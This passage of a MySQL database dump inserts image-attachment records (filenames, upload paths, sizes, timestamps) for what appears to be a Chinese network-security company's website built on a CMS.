INSERT INTO `xyh_attachment` VALUES ('48','201493011525831.jpg','img1/20170421/58f9c0aa75a51.jpg','1','52288','1','1492762794','1','0');
INSERT INTO `xyh_attachment` VALUES ('49','201493011340241.jpg','img1/20170421/58f9c0e6b9a52.jpg','1','87172','1','1492762854','1','0');
INSERT INTO `xyh_attachment` VALUES ('51','introduce02.png','img1/20170425/58fef19035fa3.png','1','27053','1','1493102992','1','0');
INSERT INTO `xyh_attachment` VALUES ('52','introduce04.png','img1/20170425/58fef1b0774f3.png','1','31847','1','1493103024','1','0');
INSERT INTO `xyh_attachment` VALUES ('53','introduce03.png','img1/20170425/58fef1b90df90.png','1','25639','1','1493103033','1','0');
INSERT INTO `xyh_attachment` VALUES ('54','introduce05.png','img1/20170425/58fef1cde0b77.png','1','22219','1','1493103053','1','0');
INSERT INTO `xyh_attachment` VALUES ('55','introduce01.png','img1/20170426/58ffeec3d3c37.png','1','29955','1','1493167811','1','0');
INSERT INTO `xyh_attachment` VALUES ('56','introduce02.png','img1/20170426/58ffeed7e584e.png','1','27053','1','1493167831','1','0');
INSERT INTO `xyh_attachment` VALUES ('57','201612051610021.jpg','img1/20170426/58fff064e24da.jpg','1','35862','1','1493168228','1','0');
INSERT INTO `xyh_attachment` VALUES ('58','timg.jpg','img1/20170426/58fff0d7ec127.jpg','1','25897','1','1493168344','1','0');
INSERT INTO `xyh_attachment` VALUES ('59','timg (1).jpg','img1/20170426/58fff12457e4b.jpg','1','26207','1','1493168420','1','0');
INSERT INTO `xyh_attachment` VALUES ('60','timg (2).jpg','img1/20170426/58fff1b481c95.jpg','1','23639','1','1493168564','1','0');
INSERT INTO `xyh_attachment` VALUES ('61','timg (3).jpg','img1/20170426/58fff1f1f260a.jpg','1','32533','1','1493168626','1','0');
INSERT INTO `xyh_attachment` VALUES ('62','timg (4).jpg','img1/20170426/58fff29c4f0e8.jpg','1','17013','1','1493168796','1','0');
INSERT INTO `xyh_attachment` VALUES ('63','timg (5).jpg','img1/20170426/58fff66d03f0c.jpg','1','21752','1','1493169773','1','0');
INSERT INTO `xyh_attachment` VALUES ('64','timg (6).jpg','img1/20170426/58fff6a66e705.jpg','1','174871','1','1493169830','1','0');
INSERT INTO `xyh_attachment` VALUES ('65','201493011958801.jpg','img1/20170426/58fff6f5efcc2.jpg','1','171235','1','1493169910','1','0');
INSERT INTO `xyh_attachment` VALUES ('66','u=350698739,1590070017&fm=23&gp=0.jpg','img1/20170426/58fff7a1ab029.jpg','1','10379','1','1493170081','1','0');
INSERT INTO `xyh_attachment` VALUES ('67','201493011525831.jpg','img1/20170426/58fff7e11effd.jpg','1','52288','1','1493170145','1','0');
INSERT INTO `xyh_attachment` VALUES ('68','wKioL1MqRSqBI8nNAABaDzEDmYc315.jpg','img1/20170426/58fff8169c398.jpg','1','23055','1','1493170198','1','0');
INSERT INTO `xyh_attachment` VALUES ('69','firewall-1.png','img1/20170428/5902982bd7422.png','1','12158','1','1493342251','1','0');
INSERT INTO `xyh_attachment` VALUES ('70','firewall-2.png','img1/20170428/5902986dc1d1c.png','1','11904','1','1493342317','1','0');
INSERT INTO `xyh_attachment` VALUES ('71','firewall-3.png','img1/20170428/59029898cd19e.png','1','18193','1','1493342360','1','0');
INSERT INTO `xyh_attachment` VALUES ('72','NIDS-1.png','img1/20170428/590299cc6238c.png','1','12128','1','1493342668','1','0');
INSERT INTO `xyh_attachment` VALUES ('73','NIDS-1.png','img1/20170428/590299d5906a8.png','1','12128','1','1493342677','1','0');
INSERT INTO `xyh_attachment` VALUES ('74','adus.png','img1/20170428/59029a25b83e7.png','1','21348','1','1493342757','1','0');
INSERT INTO `xyh_attachment` VALUES ('75','adus.png','img1/20170428/59029a2ebe9c1.png','1','21348','1','1493342766','1','0');
INSERT INTO `xyh_attachment` VALUES ('76','ids-1.png','img1/20170428/59029a559ce55.png','1','10873','1','1493342805','1','0');
INSERT INTO `xyh_attachment` VALUES ('77','web.png','img1/20170428/59029a7400771.png','1','11861','1','1493342836','1','0');
INSERT INTO `xyh_attachment` VALUES ('78','sgs.png','img1/20170428/59029a94b4444.png','1','9816','1','1493342868','1','0');
INSERT INTO `xyh_attachment` VALUES ('79','vpn.png','img1/20170428/59029acf7cb7f.png','1','12594','1','1493342927','1','0');
INSERT INTO `xyh_attachment` VALUES ('80','zhongduan.png','img1/20170428/59029af6b09ff.png','1','13919','1','1493342966','1','0');
INSERT INTO `xyh_attachment` VALUES ('81','gas.png','img1/20170428/59029b1c327d7.png','1','15446','1','1493343004','1','0');
INSERT INTO `xyh_attachment` VALUES ('82','ceshi2.png','img1/20170601/592fc3a9ce770.png','1','67705','1','1496302506','1','0');
INSERT INTO `xyh_attachment` VALUES ('83','ceshi.png','img1/20170601/592fc3b2bdf9b.png','1','56565','1','1496302514','1','0');
INSERT INTO `xyh_attachment` VALUES ('84','u=324470094,829285512&fm=23&gp=0.jpg','img1/20170602/5930b3797cea9.jpg','1','14304','1','1496363898','1','0');
INSERT INTO `xyh_attachment` VALUES ('85','timg.jpg','img1/20170602/5930b3d5765c1.jpg','1','15895','1','1496363989','1','0');
INSERT INTO `xyh_attachment` VALUES ('86','1-130926111123601.png','img1/20170608/5938c108cc436.png','1','31134','1','1496891657','1','0');
INSERT INTO `xyh_attachment` VALUES ('87','产品详细页面.png','img1/20170612/593e5f4abb5c5.png','1','1366303','1','1497259851','1','0');
INSERT INTO `xyh_attachment` VALUES ('88','机构设置.png','img1/20170612/593e621084c7a.png','1','39297','1','1497260560','1','0');
INSERT INTO `xyh_attachment` VALUES ('89','机构设置.png','img1/20170613/593f35eadffbe.png','1','39297','1','1497314795','1','0');
INSERT INTO `xyh_attachment` VALUES ('90','j-5.png','img1/20170613/593f37c1889df.png','1','19038','1','1497315265','1','0');
INSERT INTO `xyh_attachment` VALUES ('91','j-2.png','img1/20170613/593f380884691.png','1','19472','1','1497315336','1','0');
INSERT INTO `xyh_attachment` VALUES ('92','j-1.png','img1/20170613/593f3a9a8f825.png','1','22505','1','1497315994','1','0');
INSERT INTO `xyh_attachment` VALUES ('93','j-10.png','img1/20170613/593f3bc171977.png','1','20158','1','1497316289','1','0');
INSERT INTO `xyh_attachment` VALUES ('94','高新技术企业061025.jpg','img1/20170613/593f5370c9173.jpg','1','166197','1','1497322353','1','0');
INSERT INTO `xyh_attachment` VALUES ('95','高新技术企业认定证书061025.jpg','img1/20170613/593f538f0fd9f.jpg','1','167752','1','1497322383','1','0');
INSERT INTO `xyh_attachment` VALUES ('96','信息安全服务资质2.jpg','img1/20170613/593f53c63f754.jpg','1','186476','1','1497322438','1','0');
INSERT INTO `xyh_attachment` VALUES ('97','antidos2.0版权证书.jpg','img1/20170613/593f53e789799.jpg','1','327263','1','1497322471','1','0');
INSERT INTO `xyh_attachment` VALUES ('98','fw3.5版权证书.jpg','img1/20170613/593f53f892b7a.jpg','1','256241','1','1497322488','1','0');
INSERT INTO `xyh_attachment` VALUES ('99','vpn软件产品登记.jpg','img1/20170613/593f540749306.jpg','1','185794','1','1497322503','1','0');
INSERT INTO `xyh_attachment` VALUES ('100','fw软件产品登记.jpg','img1/20170613/593f541727131.jpg','1','90886','1','1497322519','1','0');
INSERT INTO `xyh_attachment` VALUES ('101','ids软件产品登记.jpg','img1/20170613/593f542714d23.jpg','1','87190','1','1497322535','1','0');
INSERT INTO `xyh_attachment` VALUES ('102','定点密码认证.jpg','img1/20170613/593f54476ace2.jpg','1','502580','1','1497322567','1','0');
INSERT INTO `xyh_attachment` VALUES ('103','定点密码认证.jpg','img1/20170613/593f54547fb62.jpg','1','502580','1','1497322580','1','0');
INSERT INTO `xyh_attachment` VALUES ('104','IDS销售许可证.jpg','img1/20170613/593f545664bc5.jpg','1','79550','1','1497322582','1','0');
INSERT INTO `xyh_attachment` VALUES ('105','hd-sms软件著作权.jpg','img1/20170613/593f546649656.jpg','1','89419','1','1497322598','1','0');
INSERT INTO `xyh_attachment` VALUES ('106','ids3.1版权证书.jpg','img1/20170613/593f54745e909.jpg','1','88309','1','1497322612','1','0');
INSERT INTO `xyh_attachment` VALUES ('107','zzry05.gif','img1/20170613/593f54824114b.gif','1','131789','1','1497322628','1','0');
INSERT INTO `xyh_attachment` VALUES ('108','江西优秀－fw_nEO_IMG.jpg','img1/20170613/593f54981cf1e.jpg','1','21260','1','1497322648','1','0');
INSERT INTO `xyh_attachment` VALUES ('109','vpn2.5版权证书.jpg','img1/20170613/593f54a6a0415.jpg','1','338089','1','1497322663','1','0');
INSERT INTO `xyh_attachment` VALUES ('110','zzry10.gif','img1/20170613/593f54c978604.gif','1','137062','1','1497322699','1','0');
INSERT INTO `xyh_attachment` VALUES ('111','20057279853555.jpg','img1/20170613/593f54d94f074.jpg','1','64832','1','1497322713','1','0');
INSERT INTO `xyh_attachment` VALUES ('112','江西优秀－IDS.jpg','img1/20170613/593f54e88695c.jpg','1','374760','1','1497322728','1','0');
INSERT INTO `xyh_attachment` VALUES ('113','zzry08.gif','img1/20170613/593f54f72b194.gif','1','165470','1','1497322745','1','0');
INSERT INTO `xyh_attachment` VALUES ('114','ISO1.jpg','img1/20170613/593f5507f3e20.jpg','1','88360','1','1497322760','1','0');
INSERT INTO `xyh_attachment` VALUES ('115','IDS-2U.JPG','img1/20170613/593f9f5b9c8dd.JPG','0','1730508','1','1497341788','1','0');
INSERT INTO `xyh_attachment` VALUES ('116','hdsms.png','img1/20170613/593f9fbf0c2ba.png','1','87395','1','1497341887','1','0');
INSERT INTO `xyh_attachment` VALUES ('117','fw.jpg','img1/20170614/5940e2a6868c0.jpg','1','30117','1','1497424550','1','0');
INSERT INTO `xyh_attachment` VALUES ('118','path1.png','img1/20170614/5940e49b68751.png','1','78340','1','1497425051','1','0');
INSERT INTO `xyh_attachment` VALUES ('119','ids.jpg','img1/20170614/5940e5b143555.jpg','1','41547','1','1497425329','1','0');
INSERT INTO `xyh_attachment` VALUES ('120','黑盾数据库安全审计系统.jpg','img1/20170614/5940ef4a3a8db.jpg','1','70373','1','1497427786','1','0');
INSERT INTO `xyh_attachment` VALUES ('121','入侵防御.png','img1/20170614/5940f6993da5e.png','1','99541','1','1497429657','1','0');
INSERT INTO `xyh_attachment` VALUES ('122','数据库安全审计.png','img1/20170614/5940f6aa3efe6.png','1','330870','1','1497429674','1','0');
INSERT INTO `xyh_attachment` VALUES ('123','黑盾防火墙.jpg','img1/20170614/5940fa49ba394.jpg','1','192635','1','1497430601','1','0');
INSERT INTO `xyh_attachment` VALUES ('124','黑盾HD-SMS.jpg','img1/20170614/594104275e64a.jpg','1','25727','1','1497433127','1','0');
INSERT INTO `xyh_attachment` VALUES ('125','黑盾VPN.jpg','img1/20170614/5941045301cf1.jpg','1','22944','1','1497433171','1','0');
INSERT INTO `xyh_attachment` VALUES ('126','黑盾web应用.jpg','img1/20170614/5941047007069.jpg','1','29622','1','1497433200','1','0');
INSERT INTO `xyh_attachment` VALUES ('127','黑盾安全隔离和信息交换.jpg','img1/20170614/5941049042c41.jpg','1','30618','1','1497433232','1','0');
INSERT INTO `xyh_attachment` VALUES ('128','黑盾安全网关.jpg','img1/20170614/594104a5a86e4.jpg','1','24851','1','1497433253','1','0');
INSERT INTO `xyh_attachment` VALUES ('129','朗易IT管理.jpg','img1/20170614/594104c687175.jpg','1','27377','1','1497433286','1','0');
INSERT INTO `xyh_attachment` VALUES ('130','财政应用.png','img1/20170614/594108addba6e.png','1','121091','1','1497434285','1','0');
INSERT INTO `xyh_attachment` VALUES ('131','黑盾网络安全审计.jpg','img1/20170615/5941d9e3b9aa2.jpg','1','27896','1','1497487843','1','0');
INSERT INTO `xyh_attachment` VALUES ('132','黑盾项目管理.jpg','img1/20170615/5941db89734d5.jpg','1','13079','1','1497488265','1','0');
INSERT INTO `xyh_attachment` VALUES ('133','黑盾安全网关.jpg','img1/20170615/5941dbd0246b5.jpg','1','24851','1','1497488336','1','0');
INSERT INTO `xyh_attachment` VALUES ('134','黑盾安全网关.jpg','img1/20170615/5941dd37aa1cc.jpg','1','21376','1','1497488695','1','0');
INSERT INTO `xyh_attachment` VALUES ('135','黑盾数据库安全审计.jpg','img1/20170615/5941dd91cbbca.jpg','1','45014','1','1497488785','1','0');
INSERT INTO `xyh_attachment` VALUES ('136','黑盾入侵防御系统.jpg','img1/20170615/5941de076a325.jpg','1','21961','1','1497488903','1','0');
INSERT INTO `xyh_attachment` VALUES ('137','政府.jpg','img1/20170615/5941f5cc358ff.jpg','1','58850','1','1497494988','1','0');
INSERT INTO `xyh_attachment` VALUES ('138','医疗.jpg','img1/20170615/5941f5e1e4d14.jpg','1','51249','1','1497495010','1','0');
INSERT INTO `xyh_attachment` VALUES ('139','高校vpn.jpg','img1/20170615/5941f5fc2b961.jpg','1','48481','1','1497495036','1','0');
INSERT INTO `xyh_attachment` VALUES ('140','企业VPN.jpg','img1/20170615/5941f600a1990.jpg','1','88846','1','1497495040','1','0');
INSERT INTO `xyh_attachment` VALUES ('141','政府IDS.jpg','img1/20170615/5941f624e6483.jpg','1','65471','1','1497495077','1','0');
INSERT INTO `xyh_attachment` VALUES ('142','企业IDS.jpg','img1/20170615/5941f6296730e.jpg','1','107241','1','1497495081','1','0');
INSERT INTO `xyh_attachment` VALUES ('143','1.gif','img1/20170616/59438f7152100.gif','1','23494','1','1497599857','1','0');
INSERT INTO `xyh_attachment` VALUES ('144','机构设置.png','img1/20170616/59438f94ce55a.png','1','39297','1','1497599893','1','0');
INSERT INTO `xyh_attachment` VALUES ('145','产品详细页面.png','img1/20170616/5943911fdd4fe.png','1','1366303','1','1497600288','1','0');
INSERT INTO `xyh_attachment` VALUES ('146','projict_ws.gif','img1/20170616/5943954d225a5.gif','1','24380','1','1497601357','1','0');
INSERT INTO `xyh_attachment` VALUES ('147','projict_ws2.gif','img1/20170616/594395627d739.gif','1','19063','1','1497601378','1','0');
INSERT INTO `xyh_attachment` VALUES ('148','about_us1.gif','img1/20170616/594398c993faf.gif','1','16457','1','1497602249','1','0');
INSERT INTO `xyh_attachment` VALUES ('149','1-130926111123601.png','img1/20170616/594399ed407b9.png','1','31134','1','1497602541','1','0');
INSERT INTO `xyh_attachment` VALUES ('150','1-13092611092B54.png','img1/20170616/59439b74ba6a3.png','1','73373','1','1497602932','1','0');
INSERT INTO `xyh_attachment` VALUES ('151','1-130926111222294.png','img1/20170616/59439bdf5a532.png','1','39279','1','1497603039','1','0');
INSERT INTO `xyh_attachment` VALUES ('152','1-13092211005YQ.PNG','img1/20170616/59439bf798abc.PNG','0','53578','1','1497603063','1','0');
INSERT INTO `xyh_attachment` VALUES ('153','1-1309261114592J.png','img1/20170616/59439c3fb1aa2.png','1','45739','1','1497603135','1','0');
INSERT INTO `xyh_attachment` VALUES ('154','2.PNG','img1/20170616/59439cd76ce31.PNG','0','56571','1','1497603287','1','0');
INSERT INTO `xyh_attachment` VALUES ('155','1-130926111923P4.png','img1/20170616/59439e0e24ff1.png','1','89102','1','1497603598','1','0');
INSERT INTO `xyh_attachment` VALUES ('156','1-130922111H03B.PNG','img1/20170616/59439e20ec371.PNG','0','54882','1','1497603617','1','0');
INSERT INTO `xyh_attachment` VALUES ('157','1-1309161434124U.PNG','img1/20170616/59439e788e2f3.PNG','0','32132','1','1497603704','1','0');
INSERT INTO `xyh_attachment` VALUES ('158','454545.gif','img1/20170616/5943a01625ddd.gif','1','23494','1','1497604118','1','0');
INSERT INTO `xyh_attachment` VALUES ('159','projict_jy.gif','img1/20170616/5943a0c9be968.gif','1','28719','1','1497604298','1','0');
INSERT INTO `xyh_attachment` VALUES ('160','22.gif','img1/20170616/5943a1cbe3fd1.gif','1','36361','1','1497604556','1','0');
INSERT INTO `xyh_attachment` VALUES ('161','33.gif','img1/20170616/5943a1e407bc8.gif','1','33072','1','1497604580','1','0');
INSERT INTO `xyh_attachment` VALUES ('162','44.gif','img1/20170616/5943a205134d8.gif','1','8707','1','1497604613','1','0');
INSERT INTO `xyh_attachment` VALUES ('163','66.gif','img1/20170616/5943a259c6d3a.gif','1','37605','1','1497604698','1','0');
INSERT INTO `xyh_attachment` VALUES ('164','77.gif','img1/20170616/5943a363d30c8.gif','1','8031','1','1497604964','1','0');
INSERT INTO `xyh_attachment` VALUES ('165','11.gif','img1/20170616/5943a379d18e6.gif','1','4448','1','1497604985','1','0');
INSERT INTO `xyh_attachment` VALUES ('166','2.png','img1/20170616/5943a9c14eed7.png','1','57152','1','1497606593','1','0');
INSERT INTO `xyh_attachment` VALUES ('167','2.png','img1/20170616/5943ace7748fe.png','1','57152','1','1497607399','1','0');
INSERT INTO `xyh_attachment` VALUES ('168','B.jpg','img1/20170622/594b38355271a.jpg','1','156892','1','1498101813','1','0');
INSERT INTO `xyh_attachment` VALUES ('169','20149301176913.jpg','img1/20170627/5951ad1e47752.jpg','1','111402','1','1498524961','1','0');
INSERT INTO `xyh_attachment` VALUES ('170','201493011714784.jpg','img1/20170627/5951ad1f8a747.jpg','1','55922','1','1498524961','1','0');
INSERT INTO `xyh_attachment` VALUES ('171','201493011723920.jpg','img1/20170627/5951ad20c21a4.jpg','1','61511','1','1498524961','1','0');
INSERT INTO `xyh_attachment` VALUES ('172','20149301176913.jpg','img1/20170627/5951ad22dfc7a.jpg','1','111402','1','1498524965','1','0');
INSERT INTO `xyh_attachment` VALUES ('173','201493011714784.jpg','img1/20170627/5951ad24143ce.jpg','1','55922','1','1498524965','1','0');
INSERT INTO `xyh_attachment` VALUES ('174','201493011723920.jpg','img1/20170627/5951ad255bfe3.jpg','1','61511','1','1498524965','1','0');
INSERT INTO `xyh_attachment` VALUES ('175','lvyou11.jpg','img1/20170629/5954a2b9d3eaf.jpg','1','273740','1','1498718906','1','0');
INSERT INTO `xyh_attachment` VALUES ('176','lvyou11.jpg','img1/20170629/5954a55e8f6f6.jpg','1','273740','1','1498719582','1','0');
INSERT INTO `xyh_attachment` VALUES ('177','lvyou11.jpg','img1/20170629/5954c1e426b57.jpg','1','273740','1','1498726884','1','0');
INSERT INTO `xyh_attachment` VALUES ('178','lvyou22.jpg','img1/20170629/5954c1ec299cf.jpg','1','284494','1','1498726892','1','0');
INSERT INTO `xyh_attachment` VALUES ('179','lvyou33.jpg','img1/20170629/5954c1f95d81b.jpg','1','188749','1','1498726905','1','0');
INSERT INTO `xyh_attachment` VALUES ('180','lvyou66.jpg','img1/20170629/5954c2036b52b.jpg','1','240909','1','1498726915','1','0');
INSERT INTO `xyh_attachment` VALUES ('181','lvyou77.jpg','img1/20170629/5954c20de640c.jpg','1','287330','1','1498726926','1','0');
INSERT INTO `xyh_attachment` VALUES ('182','lvyou1111.jpg','img1/20170629/5954c21ed0df9.jpg','1','252461','1','1498726942','1','0');
INSERT INTO `xyh_attachment` VALUES ('183','huangshan11.JPG','img1/20170630/5955a366c6c51.JPG','0','52345','1','1498784615','1','0');
INSERT INTO `xyh_attachment` VALUES ('184','huangshan33.JPG','img1/20170630/5955a37768b80.JPG','0','34806','1','1498784631','1','0');
INSERT INTO `xyh_attachment` VALUES ('185','5956fdd96a54e.jpg','img1/20170701/595746afb88f0.jpg','1','253524','1','1498891951','1','0');
INSERT INTO `xyh_attachment` VALUES ('186','5956fc7f9bcdb.png','img1/20170701/595746b61977c.png','1','68391','1','1498891958','1','0');
INSERT INTO `xyh_attachment` VALUES ('187','5956fdd96a54e.jpg','img1/20170701/595747212c8a8.jpg','1','253524','1','1498892065','1','0');
INSERT INTO `xyh_attachment` VALUES ('188','jizhong.jpg','img1/20170701/5957476618fee.jpg','1','72829','1','1498892134','1','0');
INSERT INTO `xyh_attachment` VALUES ('189','5957013c0608d.jpg','img1/20170701/5957477941ca6.jpg','1','69961','1','1498892153','1','0');
INSERT INTO `xyh_attachment` VALUES ('190','27000 (1).jpg','img1/20170701/59574c2917380.jpg','1','518376','1','1498893353','1','0');
INSERT INTO `xyh_attachment` VALUES ('191','IS09001.jpg','img1/20170701/59574c8fabde5.jpg','1','734366','1','1498893456','1','0');
INSERT INTO `xyh_attachment` VALUES ('192','安全服务二级资质.jpg','img1/20170701/59574ccf60190.jpg','1','415856','1','1498893520','1','0');
INSERT INTO `xyh_attachment` VALUES ('193','创新型企业.jpg','img1/20170701/59574ce1970a3.jpg','1','557099','1','1498893539','1','0');
INSERT INTO `xyh_attachment` VALUES ('194','福建省软件技术研发中心.jpg','img1/20170701/59574cfa0e2c8.jpg','1','975802','1','1498893562','1','0');
INSERT INTO `xyh_attachment` VALUES ('195','福建省网络与信息安全应急技术支撑单位2016.jpg','img1/20170701/59574d06dda0f.jpg','1','462430','1','1498893576','1','0');
INSERT INTO `xyh_attachment` VALUES ('196','高新企业技术证书.jpg','img1/20170701/59574d13d255c.jpg','1','574814','1','1498893589','1','0');
INSERT INTO `xyh_attachment` VALUES ('197','工程技术研究.jpg','img1/20170701/59574d2031216.jpg','1','363852','1','1498893601','1','0');
INSERT INTO `xyh_attachment` VALUES ('198','软件企业认定证书、.jpg','img1/20170701/59574d2a9947a.jpg','1','831079','1','1498893611','1','0');
INSERT INTO `xyh_attachment` VALUES ('199','商用密码产品生产定点单位证书(新.jpg','img1/20170701/59574d3a6fc0c.jpg','1','678888','1','1498893627','1','0');
INSERT INTO `xyh_attachment` VALUES ('200','信息安全等级保护安全建设服务机构能力评估合格证书.jpg','img1/20170701/59574d44ca795.jpg','1','628681','1','1498893637','1','0');
INSERT INTO `xyh_attachment` VALUES ('201','47-48-01.jpg','img1/20170702/595890e94bdb3.jpg','1','409076','1','1498976489','1','0');
INSERT INTO `xyh_attachment` VALUES ('202','1.jpg','img1/20170702/595890fb55a13.jpg','1','41741','1','1498976507','1','0');
INSERT INTO `xyh_attachment` VALUES ('203','2.jpg','img1/20170702/5958915060d3b.jpg','1','49393','1','1498976592','1','0');
INSERT INTO `xyh_attachment` VALUES ('204','47-48-01.jpg','img1/20170702/595891516ffa8.jpg','1','401823','1','1498976593','1','0');
INSERT INTO `xyh_attachment` VALUES ('205','3.jpg','img1/20170702/595891956b8e8.jpg','1','68154','1','1498976661','1','0');
INSERT INTO `xyh_attachment` VALUES ('206','49-50-01.jpg','img1/20170702/5958955df26b6.jpg','1','240037','1','1498977630','1','0');
INSERT INTO `xyh_attachment` VALUES ('207','专家工作站副本.jpg','img1/20170702/5958b226b82f3.jpg','1','311640','1','1498984998','1','0');
INSERT INTO `xyh_attachment` VALUES ('208','1.jpg','img1/20170702/5958b49584170.jpg','1','51589','1','1498985621','1','0');
INSERT INTO `xyh_attachment` VALUES ('209','start.png','img1/20170702/5958e983ec003.png','1','17679','1','1498999172','1','0');
INSERT INTO `xyh_attachment` VALUES ('210','1-130926111123601.png','img1/20170702/5958eaa714b16.png','1','31134','1','1498999463','1','0');
INSERT INTO `xyh_attachment` VALUES ('211','small_ico.png','img1/20170702/5958eb4222487.png','1','18187','1','1498999618','1','0');
INSERT INTO `xyh_attachment` VALUES ('212','sucexample.png','img1/20170702/5958edcaaaf99.png','1','17940','1','1499000266','1','0');
INSERT INTO `xyh_attachment` VALUES ('213','2.png','img1/20170702/5958ef3604ac1.png','1','73373','1','1499000630','1','0');
INSERT INTO `xyh_attachment` VALUES ('214','3.png','img1/20170702/5958f06859929.png','1','39279','1','1499000936','1','0');
INSERT INTO `xyh_attachment` VALUES ('215','4.PNG','img1/20170702/5958f09fca2cc.PNG','0','53578','1','1499000992','1','0');
INSERT INTO `xyh_attachment` VALUES ('216','1.png','img1/20170702/5958f527386f5.png','1','45739','1','1499002151','1','0');
INSERT INTO `xyh_attachment` VALUES ('217','2.png','img1/20170702/5958f55177bc3.png','1','58521','1','1499002193','1','0');
INSERT INTO `xyh_attachment` VALUES ('218','3.PNG','img1/20170702/5958f73b0826e.PNG','0','56571','1','1499002683','1','0');
INSERT INTO `xyh_attachment` VALUES ('219','4.png','img1/20170702/5958fa3994858.png','1','89102','1','1499003449','1','0');
INSERT INTO `xyh_attachment` VALUES ('220','5.PNG','img1/20170702/5958fa5abff1d.PNG','0','54882','1','1499003483','1','0');
INSERT INTO `xyh_attachment` VALUES ('221','6.PNG','img1/20170702/5958fb5d69966.PNG','0','32132','1','1499003741','1','0');
INSERT INTO `xyh_attachment` VALUES ('222','电子.jpg','img1/20170703/5959953ac2111.jpg','1','70702','1','1499043130','1','0');
INSERT INTO `xyh_attachment` VALUES ('223','yiliao1.jpg','img1/20170703/595996e504dd1.jpg','1','36378','1','1499043557','1','0');
INSERT INTO `xyh_attachment` VALUES ('224','yiliao2.jpg','img1/20170703/595997251da03.jpg','1','51704','1','1499043621','1','0');
INSERT INTO `xyh_attachment` VALUES ('225','yiliao3.jpg','img1/20170703/595997789e24f.jpg','1','56123','1','1499043704','1','0');
INSERT INTO `xyh_attachment` VALUES ('226','教育1.jpg','img1/20170703/595998c456cbc.jpg','1','64187','1','1499044036','1','0');
INSERT INTO `xyh_attachment` VALUES ('227','图片1.png','img1/20170703/59599c4be4c03.png','1','68391','1','1499044940','1','0');
INSERT INTO `xyh_attachment` VALUES ('228','图片2.png','img1/20170703/59599cd9629a0.png','1','127706','1','1499045081','1','0');
INSERT INTO `xyh_attachment` VALUES ('229','图片3.png','img1/20170703/59599e232af53.png','1','51092','1','1499045411','1','0');
INSERT INTO `xyh_attachment` VALUES ('230','图片4.png','img1/20170703/59599e2a0cf3f.png','1','67926','1','1499045418','1','0');
INSERT INTO `xyh_attachment` VALUES ('231','1.jpg','img1/20170703/5959a4576cf42.jpg','1','43345','1','1499046999','1','0');
INSERT INTO `xyh_attachment` VALUES ('232','2.jpg','img1/20170703/5959a52f65629.jpg','1','24949','1','1499047215','1','0');
INSERT INTO `xyh_attachment` VALUES ('233','3.jpg','img1/20170703/5959a53697ef8.jpg','1','28362','1','1499047222','1','0');
INSERT INTO `xyh_attachment` VALUES ('234','4.jpg','img1/20170703/5959a53b8b221.jpg','1','26632','1','1499047227','1','0');


# 转存表中的数据：xyh_attachmentindex 
INSERT INTO `xyh_attachmentindex` VALUES ('2','5','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('3','6','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('174','59','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('173','59','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('118','14','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('7','2','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('6','2','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('9','3','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('8','3','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('10','4','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('11','4','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('12','5','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('13','6','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('14','7','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('67','60','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('133','24','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('44','2','5','');
INSERT INTO `xyh_attachmentindex` VALUES ('123','26','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('129','12','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('64','51','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('59','56','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('57','58','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('58','57','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('60','55','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('61','54','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('62','53','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('63','52','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('124','21','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('85','64','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('68','61','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('30','8','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('31','8','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('32','9','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('33','10','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('34','10','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('35','10','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('36','10','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('37','10','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('38','11','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('39','11','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('40','11','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('41','11','4','');
INSERT INTO `xyh_attachmentindex` VALUES ('132','23','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('131','19','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('168','63','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('135','15','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('136','16','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('126','17','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('134','18','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('125','20','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('127','22','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('66','59','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('65','50','1','');
INSERT INTO `xyh_attachmentindex` VALUES ('186','27','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('187','28','3','');
INSERT INTO `xyh_attachmentindex` VALUES ('208','69','1','');


# 转存表中的数据：xyh_block 
